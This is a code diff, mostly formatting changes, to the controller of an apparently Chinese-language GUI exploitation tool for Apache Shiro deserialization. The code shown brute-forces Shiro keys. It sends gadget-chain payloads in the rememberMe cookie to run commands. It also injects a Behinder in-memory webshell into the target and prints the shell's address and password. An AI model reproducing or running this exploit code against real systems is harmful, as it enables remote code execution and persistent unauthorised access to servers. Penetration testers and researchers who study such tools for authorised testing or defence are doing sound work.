@@ -92,7 +92,6 @@ public class Controller {
     public TextField path;
 
 
-
     ExecutorService pool = Executors.newFixedThreadPool(8);
 
     public static LogUtil logUtil;
@@ -109,9 +108,9 @@ public class Controller {
     public static Map<String, Object> settingInfo = new HashMap();
 
     //标识shell有没有注入成功
-    private boolean shell =false;
+    private boolean shell = false;
 
-    private boolean isShiro =false;
+    private boolean isShiro = false;
 
 
     public void initEvent() {
@@ -196,7 +195,7 @@ public class Controller {
             logUtil.printInfoLog("开始检查目标是否用了shiro", false);
             if (ShiroTool.shiroDetect(url, method, header, params, rmeValue)) {
                 logUtil.printSucceedLog("发现shiro特征");
-                isShiro =true;
+                isShiro = true;
             } else {
                 logUtil.printAbortedLog("未发现shiro特征", false);
             }
@@ -219,7 +218,6 @@ public class Controller {
     }
 
 
-
     @FXML
     public void burstKey(ActionEvent actionEvent) {
         try {
@@ -239,11 +237,11 @@ public class Controller {
                 params = new HashMap<>();
             }
 
-            if (isShiro){
+            if (isShiro) {
                 pool.submit(new BurstJob(url, method, params, keys));
-            }else {
+            } else {
                 this.check();
-                if (isShiro)pool.submit(new BurstJob(url, method, params, keys));
+                if (isShiro) pool.submit(new BurstJob(url, method, params, keys));
             }
 
 
@@ -284,7 +282,6 @@ public class Controller {
             Map<String, Object> params = (Map<String, Object>) paramsContext.get("params");
 
 
-
             //利用链
             Class clazz = Class.forName(Constants.PAYLOAD_PACK + gadgetName);
             //rce回显
@@ -310,26 +307,12 @@ public class Controller {
             //请求包header超过8k会报header too large错误
             header.put("cookie", rmeValue + "=" + encryptData);
             header.put("s6", cmd1);
-            params.put("fuck",Base64.getEncoder().encodeToString(expPayload));
+            params.put("fuck", Base64.getEncoder().encodeToString(expPayload));
             if (isShowPayload.isSelected()) {
                 //System.out.println(""+Controller.logUtil.getLog().getCaretPosition());
                 Controller.logUtil.printData(header.toString());
             }
 
-//            if (method.equals(Constants.METHOD_GET)) {
-//                // data = HttpClientUtil.httpGetRequest(url, header);
-//                for (String s : params.keySet()) {
-//                    if (url.contains("?")){
-//                        url=url+"&"+s+"="+params.get(s);
-//                    }else {
-//                        url=url+"?"+s+"="+params.get(s);
-//                    }
-//                }
-//                //System.out.println(url);
-//                data = HttpTool.get(url, header);
-//            } else {
-//                data = HttpClientUtil.httpPostRequest(url, header, params);
-//            }
             //利用可以全程用post，哪怕目标url不支持，因为只要反序列化成功，就能接收到参数
             data = HttpClientUtil.httpPostRequest(url, header, params);
             if (data != null) {
@@ -404,14 +387,14 @@ public class Controller {
 
             //解决长度问题，把大payload放post包提交
             Class clazz1 = Class.forName(Constants.SHELL_PACK + shellName);
-            Method mtd1 = clazz1.getMethod("getMemBehinder3Payload", String.class,String.class);
+            Method mtd1 = clazz1.getMethod("getMemBehinder3Payload", String.class, String.class);
             params = new HashMap<>();
             //冰蝎内存马需要用到pageContext
             //params.put("c1", GetByteCodeUtil.getEncodeData(PageContext.class));
             //反射设置密码，取shell
-            String shellData = Base64.getEncoder().encodeToString((byte[])mtd1.invoke(null, passwd,path1));
+            String shellData = Base64.getEncoder().encodeToString((byte[]) mtd1.invoke(null, passwd, path1));
             //System.out.println(shellData);
-            params.put("fuck",shellData);
+            params.put("fuck", shellData);
             //请求包header超过8k会报header too large错误
             //此处大坑，有时候需要urlencode
             header.put("cookie", rmeValue + "=" + encryptData);
@@ -420,23 +403,23 @@ public class Controller {
                 Controller.logUtil.printData(header.toString());
                 Controller.logUtil.printData(params.toString());
             }
-            logUtil.printInfoLog("开始注入内存马",true);
+            logUtil.printInfoLog("开始注入内存马", true);
             //只能用post进行注入，get参数太长报错400
-            String ss= HttpClientUtil.httpPostRequest(url, header, params);
+            String ss = HttpClientUtil.httpPostRequest(url, header, params);
             //String ss =HttpTool.post(url,postData,header);
             if (ss.contains("inject success")) {
                 logUtil.printSucceedLog("内存马注入成功！");
-                logUtil.printSucceedLog("连接地址:  "+url+path1);
-                logUtil.printSucceedLog("shell密码:  "+passwd);
-            }else {
-                logUtil.printAbortedLog("内存马注入失败！",true);
+                logUtil.printSucceedLog("连接地址:  " + url + path1);
+                logUtil.printSucceedLog("shell密码:  " + passwd);
+            } else {
+                logUtil.printAbortedLog("内存马注入失败！", true);
                 //logUtil.printData(header1);
                 //logUtil.printData(data);
                 //logUtil.printData(ss);
             }
         } catch (Exception e) {
             e.printStackTrace();
-            logUtil.printAbortedLog("内存马注入失败！",true);
+            logUtil.printAbortedLog("内存马注入失败！", true);
         } finally {
             Platform.runLater(() -> inject.setDisable(false));
         }
@@ -478,12 +461,12 @@ public class Controller {
                 paramsContext.put("params", request.getParams());
                 paramsContext.put("paramsStr", request.getParamsStr());
 
-                if (Tools.checkTheURL(target)){
-                    paramsContext.put("url", target+request.getRequestUrl());
-                }else {
-                    paramsContext.put("url", "http://"+request.getHeader().get("Host").toString()+request.getRequestUrl());
+                if (Tools.checkTheURL(target)) {
+                    paramsContext.put("url", target + request.getRequestUrl());
+                } else {
+                    paramsContext.put("url", "http://" + request.getHeader().get("Host").toString() + request.getRequestUrl());
                 }
-                logUtil.printSucceedLog("目标URL:"+paramsContext.get("url"));
+                logUtil.printSucceedLog("目标URL:" + paramsContext.get("url"));
             } else {
                 Tools.alert("HTTP请求格式错误", "请输入一个有效的HTTP请求");
             }
@@ -779,6 +762,18 @@ public class Controller {
         stage.setOpacity(1);
         stage.setTitle("jrmp测试");
         stage.setScene(new Scene(root, 500, 80));
+        stage.setResizable(false);
+        stage.showAndWait();
+    }
+
+    public void ser(ActionEvent actionEvent)  throws IOException {
+        ClassLoader classLoader = getClass().getClassLoader();
+        Parent root = FXMLLoader.load(classLoader.getResource("decode.fxml"));
+        Stage stage = new Stage();
+        stage.initModality(Modality.APPLICATION_MODAL);
+        stage.setOpacity(1);
+        stage.setTitle("反序列化payload提取");
+        stage.setScene(new Scene(root, 980, 750));
         stage.setResizable(false);
         stage.showAndWait();
     }
